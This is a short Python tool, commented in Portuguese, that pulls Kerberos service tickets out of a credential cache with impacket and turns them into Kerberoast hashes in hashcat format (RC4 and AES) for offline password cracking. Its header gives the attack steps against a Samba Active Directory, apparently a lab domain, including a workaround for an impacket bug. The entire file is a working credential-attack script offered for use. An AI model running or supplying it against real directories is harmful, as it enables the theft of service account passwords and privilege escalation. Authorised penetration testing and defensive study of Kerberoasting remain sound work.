#!/usr/bin/env python3
# Extrai hash Kerberoast ($krb5tgs$) de tickets de servico ja presentes num ccache.
# Uso contra Samba AD: pedir o TGS com kerberos NATIVO (kvno SPN) e depois extrair aqui,
# contornando o bug de TGS-REQ do impacket contra o KDC Heimdal do Samba.
#   kinit user@REALM ; kvno MSSQLSvc/dc01.corp.lab:1433 ; ccache2hashcat.py $KRB5CCNAME
import sys
from binascii import hexlify
from impacket.krb5.ccache import CCache
from impacket.krb5.asn1 import Ticket as TicketAsn1
from pyasn1.codec.der import decoder

ccpath = sys.argv[1] if len(sys.argv) > 1 else '/tmp/krb5cc_0'
cc = CCache.loadFile(ccpath)

for cred in cc.credentials:
    spn_full = cred['server'].prettyPrint().decode('utf-8')      # SPN@REALM
    low = spn_full.lower()
    if low.startswith('krbtgt/') or low.startswith('kadmin/'):   # nao sao contas roastaveis
        continue
    client = cred['client'].prettyPrint().decode('utf-8')        # user@REALM
    user = client.split('@')[0]
    spn = spn_full.split('@')[0]
    raw = bytes(cred.ticket['data'])
    tkt = decoder.decode(raw, asn1Spec=TicketAsn1())[0]
    realm = str(tkt['realm'])
    etype = int(tkt['enc-part']['etype'])
    cipher = bytes(tkt['enc-part']['cipher'].asOctets())
    if etype == 23:                                              # RC4 -> hashcat 13100
        print('$krb5tgs$23$*%s$%s$%s*$%s$%s' % (
            user, realm, spn, hexlify(cipher[:16]).decode(), hexlify(cipher[16:]).decode()))
    elif etype in (17, 18):                                      # AES -> hashcat 19600/19700
        print('$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
            etype, user, realm, spn,
            hexlify(cipher[-12:]).decode(), hexlify(cipher[:-12]).decode()))
    else:
        sys.stderr.write('# etype %d nao suportado p/ %s\n' % (etype, spn))
